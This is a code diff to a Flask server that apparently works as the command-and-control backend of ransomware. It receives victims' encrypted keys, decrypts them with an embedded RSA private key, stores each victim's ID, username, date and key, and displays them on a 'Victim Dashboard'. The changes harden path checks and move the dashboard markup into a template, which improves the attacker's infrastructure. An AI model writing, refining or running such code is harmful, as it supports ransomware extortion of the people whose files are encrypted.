@@ -16,7 +16,6 @@ import re
 from flask import Flask, request, render_template_string
 from Crypto.PublicKey import RSA
 from Crypto.Cipher import PKCS1_OAEP
-from markupsafe import escape
 
 RSA_PRIVATE_KEY = """-----BEGIN RSA PRIVATE KEY-----
 MIIEqAIBAAKCAQEAjdIcVka2US3tcvXqQ90+XNYt5bJv10x+/0KRSph03Z/RIp/g
@@ -59,7 +58,7 @@ def decrypt_key(encrypted_key):
 
 def sanitize_path_component(component):
     if not component:
-        return "_" 
+        return "_"
     component = re.sub(r'[^a-zA-Z0-9_-]', '_', component)
     if component == "." or component == "..":
         return "_"
@@ -86,25 +85,26 @@ def upload():
         app.logger.error(f"Invalid base64-encoded key for {victim_id}: {e}")
         return "Invalid base64-encoded key format.", 400
 
-    victim_folder_path = os.path.join(BASE_FOLDER, victim_id)
-    
-    if not os.path.abspath(victim_folder_path).startswith(BASE_FOLDER + os.sep):
-        app.logger.warning(f"Path traversal attempt detected for victim_id: {victim_id_raw} (sanitized: {victim_id})")
+    victim_folder_candidate = os.path.join(BASE_FOLDER, victim_id)
+    victim_folder_abs = os.path.abspath(victim_folder_candidate)
+
+    if not victim_folder_abs.startswith(BASE_FOLDER + os.sep):
+        app.logger.warning(f"Path traversal attempt (upload): victim_id='{victim_id_raw}', sanitized='{victim_id}', candidate='{victim_folder_candidate}', abs='{victim_folder_abs}'")
         return "Invalid victim ID (path traversal attempt detected).", 400
     
     try:
-        os.makedirs(victim_folder_path, exist_ok=True)
+        os.makedirs(victim_folder_abs, exist_ok=True)
     except OSError as e:
-        app.logger.error(f"Could not create directory {victim_folder_path}: {e}")
+        app.logger.error(f"Could not create directory {victim_folder_abs}: {e}")
         return "Server error: Could not create victim directory.", 500
 
-    info_file_path = os.path.join(victim_folder_path, "info.json")
-    key_file_path = os.path.join(victim_folder_path, "key.txt")
+    info_file_path = os.path.join(victim_folder_abs, "info.json")
+    key_file_path = os.path.join(victim_folder_abs, "key.txt")
 
-    if not os.path.abspath(info_file_path).startswith(BASE_FOLDER + os.sep) or \
-       not os.path.abspath(key_file_path).startswith(BASE_FOLDER + os.sep):
-        app.logger.warning(f"Path traversal attempt detected for file paths with victim_id: {victim_id}")
-        return "Invalid file path (path traversal attempt detected).", 400
+    if not info_file_path.startswith(victim_folder_abs + os.sep) or \
+       not key_file_path.startswith(victim_folder_abs + os.sep):
+        app.logger.error(f"Internal path safety check failed for victim_id: {victim_id}. Info: {info_file_path}, Key: {key_file_path}, Base: {victim_folder_abs}")
+        return "Invalid file path (internal safety check).", 400
 
     try:
         with open(info_file_path, "w") as f:
@@ -116,9 +116,8 @@ def upload():
         app.logger.error(f"Error writing files for victim {victim_id}: {e}")
         return "Server error: Could not write victim data.", 500
     except Exception as e:
-        app.logger.error(f"Error decrypting key for victim {victim_id}: {e}")
+        app.logger.error(f"Error processing key for victim {victim_id}: {e}")
         return "Error processing key.", 500
-
 
     print(f"Saved victim: {victim_id}")
     return f"Victim {victim_id} received.", 200
@@ -126,25 +125,27 @@ def upload():
 
 @app.route("/dashboard")
 def dashboard():
-    victim_cards_html = []
+    victims_data = []
     try:
         for vid_raw in os.listdir(BASE_FOLDER):
             vid = sanitize_path_component(vid_raw)
             if not vid or vid == "_":
                 continue
 
-            victim_dir_path = os.path.join(BASE_FOLDER, vid)
-            if not os.path.isdir(victim_dir_path) or \
-               not os.path.abspath(victim_dir_path).startswith(BASE_FOLDER + os.sep):
-                app.logger.warning(f"Skipping non-directory or potential traversal item in dashboard: {vid_raw}")
+            victim_dir_candidate = os.path.join(BASE_FOLDER, vid)
+            victim_dir_abs = os.path.abspath(victim_dir_candidate)
+
+            if not os.path.isdir(victim_dir_abs) or \
+               not victim_dir_abs.startswith(BASE_FOLDER + os.sep):
+                app.logger.warning(f"Skipping non-directory or potential traversal item in dashboard: raw='{vid_raw}', abs='{victim_dir_abs}'")
                 continue
 
-            vpath = os.path.join(victim_dir_path, "info.json")
-            kpath = os.path.join(victim_dir_path, "key.txt")
+            vpath = os.path.join(victim_dir_abs, "info.json")
+            kpath = os.path.join(victim_dir_abs, "key.txt")
 
-            if not os.path.abspath(vpath).startswith(BASE_FOLDER + os.sep) or \
-               not os.path.abspath(kpath).startswith(BASE_FOLDER + os.sep):
-                app.logger.warning(f"Skipping potential traversal file paths in dashboard for vid: {vid}")
+            if not vpath.startswith(victim_dir_abs + os.sep) or \
+               not kpath.startswith(victim_dir_abs + os.sep):
+                app.logger.warning(f"Skipping item due to internal path safety check for vid: {vid}")
                 continue
 
             if os.path.exists(vpath) and os.path.exists(kpath):
@@ -153,26 +154,21 @@ def dashboard():
                         info = json.load(f)
                     with open(kpath, "r") as f:
                         key = f.read().strip()
-
-                    card = f"""
-                    <div style='border:1px solid #444;padding:10px;margin-bottom:10px;border-radius:5px;'>
-                        <b>ID:</b> {escape(info.get('id', 'N/A'))}<br>
-                        <b>User:</b> {escape(info.get('username', 'N/A'))}<br>
-                        <b>Date:</b> {escape(info.get('date', 'N/A'))}<br>
-                        <b>Key:</b> <code>{escape(key)}</code>
-                    </div>
-                    """
-                    victim_cards_html.append(card)
+                    
+                    victims_data.append({
+                        "id": info.get("id", "N/A"),
+                        "username": info.get("username", "N/A"),
+                        "date": info.get("date", "N/A"),
+                        "key": key
+                    })
                 except json.JSONDecodeError:
                     app.logger.warning(f"Could not decode JSON for victim: {vid}")
                 except IOError:
                     app.logger.warning(f"Could not read files for victim: {vid}")
     except OSError as e:
         app.logger.error(f"Error listing victims in dashboard: {e}")
-        victim_cards_html.append("<p>Error loading victim data.</p>")
 
-
-    html_content = f"""
+    html_template = """
     <!DOCTYPE html>
     <html>
         <head>
@@ -180,11 +176,26 @@ def dashboard():
         </head>
         <body style='font-family:monospace;background:#111;color:#eee;padding:20px;'>
             <h1>Victim Dashboard</h1>
-            {''.join(victim_cards_html) if victim_cards_html else "<p>No victims yet.</p>"}
+            {% if victims %}
+                {% for victim in victims %}
+                <div style='border:1px solid #444;padding:10px;margin-bottom:10px;border-radius:5px;'>
+                    <b>ID:</b> {{ victim.id }}<br>
+                    <b>User:</b> {{ victim.username }}<br>
+                    <b>Date:</b> {{ victim.date }}<br>
+                    <b>Key:</b> <code>{{ victim.key }}</code>
+                </div>
+                {% endfor %}
+            {% else %}
+                <p>No victims yet.</p>
+            {% endif %}
+            {% if error_message %}
+                <p style='color:red;'>{{ error_message }}</p>
+            {% endif %}
         </body>
     </html>
     """
-    return render_template_string(html_content)
+    error_msg = "Error loading victim data." if 'e' in locals() and isinstance(e, OSError) else None
+    return render_template_string(html_template, victims=victims_data, error_message=error_msg)
 
 
 if __name__ == "__main__":
